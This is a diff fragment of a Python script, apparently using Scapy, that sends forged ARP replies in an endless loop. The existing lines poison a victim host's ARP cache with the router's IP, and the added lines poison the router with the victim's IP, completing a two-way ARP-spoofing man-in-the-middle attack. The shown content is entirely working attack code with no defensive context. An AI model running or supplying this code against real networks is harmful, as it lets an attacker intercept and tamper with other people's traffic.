@@ -14,4 +14,11 @@ while True:
     victim_packet = Ether(dst=victim_mac) / ARP(op = 2, psrc = router_ip, pdst = victim_ip, hwdst = victim_mac, hwsrc = my_mac)
     print(victim_packet)
     sendp(victim_packet)
+
+    time.sleep(1)
+
+    router_packet = Ether(dst=router_mac) / ARP(op = 2, psrc = victim_ip, pdst = router_ip, hwdst = router_mac, hwsrc = my_mac)
+    print(router_packet)
+    sendp(router_packet)
+
     time.sleep(1)
